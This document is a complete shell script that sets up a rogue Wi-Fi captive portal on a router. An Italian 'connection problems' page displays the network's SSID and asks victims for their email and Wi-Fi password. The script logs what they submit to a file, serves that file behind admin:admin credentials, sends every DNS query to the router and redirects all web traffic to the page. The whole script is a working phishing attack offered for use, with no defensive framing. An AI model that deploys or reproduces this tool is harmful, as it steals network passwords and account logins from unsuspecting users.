#!/bin/sh
# Captive Portal via inetd (no CGI needed)
P=/tmp/portal; R=192.168.0.1; LAN=br0
SSID=$(nvram get ssid 2>/dev/null || nvram get wl0_ssid 2>/dev/null || cat /tmp/portal_ssid 2>/dev/null || echo WiFi)
echo "$SSID" > /tmp/portal_ssid
mkdir -p $P

# --- Pagina portale ---
cat > $P/index.html << ENDHTML
<!DOCTYPE html><html lang=it><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Connessione Wi-Fi</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}.c{background:#fff;border-radius:16px;padding:28px 24px;max-width:390px;width:100%;box-shadow:0 20px 50px rgba(0,0,0,.5)}h1{font-size:19px;color:#1a1a2e;margin:14px 0 8px}p{font-size:13px;color:#555;margin-bottom:18px;line-height:1.5}.s{background:#f0f4ff;border:1px solid #c7d4ff;border-radius:6px;padding:2px 9px;font-weight:700;color:#3a56d4}label{display:block;font-size:11px;font-weight:600;color:#444;margin-bottom:3px;text-transform:uppercase}input{width:100%;padding:11px 12px;border:1.5px solid #dde3f0;border-radius:8px;font-size:14px;margin-bottom:11px;outline:none}input:focus{border-color:#3a56d4}button{width:100%;padding:12px;background:#3a56d4;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer}</style></head><body><div class=c><svg width=48 height=48 viewBox="0 0 48 48"><circle cx=24 cy=24 r=24 fill=#fff3cd/><path d="M8 20c4.4-4.7 10-7.5 16-7.5s11.6 2.8 16 7.5M12 26c3.2-3.5 7.2-5.5 12-5.5s8.8 2 12 5.5M16 32c2-2.5 4.8-4 8-4s6 1.5 8 4" stroke=#ffc107 stroke-width=3 fill=none stroke-linecap=round/><circle cx=24 cy=38 r=2 fill=#e67e00/><rect x=22.5 y=32 width=3 height=4 rx=1.5 fill=#e67e00/></svg><h1>Problemi di connessione</h1><p>Stai avendo difficolt&agrave; a connetterti a<br><span class=s>$SSID</span><br>Inserisci le credenziali per ripristinare la connessione.</p><form action=/connect method=POST><label>Email / Nome utente</label><input type=email name=u placeholder="nome@esempio.com" required><label>Password Wi-Fi</label><input type=password name=p placeholder="Password" required><button type=submit>Connetti alla rete</button></form></div></body></html>
ENDHTML

# --- HTTP handler (eseguito da inetd per ogni connessione) ---
cat > /tmp/http_handler.sh << 'ENDHANDLER'
#!/bin/sh
ud(){ printf '%b' "$(echo "$1"|sed 's/+/ /g;s/%\([0-9a-fA-F][0-9a-fA-F]\)/\\x\1/g')";}

# Leggi request line
read -r LINE
METHOD=$(echo "$LINE"|cut -d' ' -f1)
RPATH=$(echo "$LINE"|cut -d' ' -f2|cut -d'?' -f1)

# Leggi headers, cattura Content-Length e Authorization
CLEN=0; AUTH=""
while read -r HDR; do
    HDR=$(echo "$HDR"|tr -d '\r')
    [ -z "$HDR" ] && break
    case "$(echo "$HDR"|cut -d: -f1|tr A-Z a-z)" in
        content-length)  CLEN=$(echo "$HDR"|cut -d: -f2|tr -d ' ');;
        authorization)   AUTH=$(echo "$HDR"|cut -d' ' -f3);;
    esac
done

# Leggi body POST
BODY=""
[ "$METHOD" = "POST" ] && [ "$CLEN" -gt 0 ] 2>/dev/null && \
    BODY=$(dd bs=1 count=$CLEN 2>/dev/null)

SUCCESS='<!DOCTYPE html><html><head><meta charset=UTF-8><meta http-equiv=refresh content="3;url=http://www.google.com"><title>OK</title><style>body{font-family:sans-serif;background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh}div{background:#fff;border-radius:16px;padding:36px;text-align:center;max-width:300px}h2{color:#22c55e;margin:12px 0 6px}p{color:#666;font-size:13px}</style></head><body><div><svg width=56 height=56 viewBox="0 0 56 56"><circle cx=28 cy=28 r=28 fill=#e6f9f0/><path d="M14 28l9 9 19-19" stroke=#22c55e stroke-width=3 fill=none stroke-linecap=round stroke-linejoin=round/></svg><h2>Connessione riuscita!</h2><p>Verrai reindirizzato a breve...</p></div></body></html>'

# admin:admin in base64
ADMIN_B64="YWRtaW46YWRtaW4="

case "$RPATH" in
    /connect)
        U=$(ud "$(echo "$BODY"|sed -n 's/.*\bu=\([^&]*\).*/\1/p')")
        W=$(ud "$(echo "$BODY"|sed -n 's/.*\bp=\([^&]*\).*/\1/p')")
        printf '[%s] ip=? ssid=%s user=%s pass=%s\n' \
            "$(date '+%F %T')" "$(cat /tmp/portal_ssid 2>/dev/null)" "$U" "$W" >> /tmp/creds.log
        printf 'HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s' \
            "${#SUCCESS}" "$SUCCESS"
        ;;
    /creds|/cgi-bin/creds.cgi|/admin/creds)
        # Richiede Basic Auth admin:admin
        if [ "$AUTH" != "$ADMIN_B64" ]; then
            MSG="Accesso non autorizzato."
            printf 'HTTP/1.0 401 Unauthorized\r\nWWW-Authenticate: Basic realm="Admin"\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s' \
                "${#MSG}" "$MSG"
        else
            BODY=$(cat /tmp/creds.log 2>/dev/null || echo 'Nessuna credenziale catturata.')
            printf 'HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nContent-Length: %d\r\n\r\n%s' \
                "${#BODY}" "$BODY"
        fi
        ;;
    *)
        PAGE=$(cat /tmp/portal/index.html)
        printf 'HTTP/1.0 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n%s' \
            "${#PAGE}" "$PAGE"
        ;;
esac
ENDHANDLER
chmod +x /tmp/http_handler.sh

# --- inetd config per porta 8080 ---
echo '8080 stream tcp nowait root /tmp/http_handler.sh http_handler.sh' > /tmp/inetd_portal.conf
inetd /tmp/inetd_portal.conf

# --- DNS spoofing ---
echo "* $R" > /tmp/dnsd.conf
kill $(pidof dnsd) 2>/dev/null
dnsd -c /tmp/dnsd.conf -i $R &

# --- iptables ---
iptables -t nat -F CAPTIVE 2>/dev/null; iptables -t nat -X CAPTIVE 2>/dev/null
iptables -t nat -N CAPTIVE
iptables -t nat -A CAPTIVE -s $R -j RETURN
iptables -t nat -A CAPTIVE -p tcp --dport 80  -j DNAT --to $R:8080
iptables -t nat -A CAPTIVE -p udp --dport 53  -j DNAT --to $R:53
iptables -t nat -A CAPTIVE -p tcp --dport 53  -j DNAT --to $R:53
iptables -t nat -A PREROUTING -i $LAN -j CAPTIVE
